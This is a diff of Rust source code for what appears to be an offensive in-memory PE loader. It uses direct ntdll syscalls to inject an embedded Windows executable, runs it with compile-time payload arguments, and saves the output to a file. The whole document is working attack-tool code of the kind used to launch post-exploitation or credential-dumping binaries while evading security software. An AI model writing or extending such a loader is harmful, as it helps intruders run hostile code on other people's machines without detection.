@@ -1,4 +1,6 @@
 use std::any::Any;
+use std::fs::File;
+use std::io::Write;
 use std::panic;
 
 #[allow(unused_imports)]
@@ -55,38 +57,17 @@ fn get_pe() -> Vec<u8> {
 }
  
 fn load(pe_bytes: Vec<u8>, options: PE_Options) {
-    
-
+    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
     let ntdll = SyscallWrapper::new();
-    debug_info_msg!("Loading ...");
 
     let mut pe_loader = PE_Loader::new(ntdll, options);
-    if !pe_loader.inject(pe_bytes) {
-        debug_error_msg!("Failed to inject PE.");
-        return;
+    match pe_loader.execute_exe(pe_bytes.clone(), args) {
+       None => debug_error_msg!("Failed to execute PE."),
+       Some(output) => { 
+            debug_success_msg!(format!("PE Executed : output = \n{}", output));
+            let mut file = File::create("output.txt").unwrap();
+            write!(file, "{}", output).unwrap();
+        }
     }
-
-    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
-    debug_success_msg!(format!("args = {}", args));
-
-    if !pe_loader.execute(String::from("coffee exit")) {
-        debug_error_msg!("Failed to execute PE.");
-        return;
-    }
-
-    if !pe_loader.execute(args) {
-        debug_error_msg!("Failed to execute PE.");
-        return;
-    }
-
-
-    
-
-    if !pe_loader.clean() {
-        debug_error_msg!("Failed to clean PE.");
-        return;
-    }
-
-    debug_ok_msg!("PE executed.");
 }
 
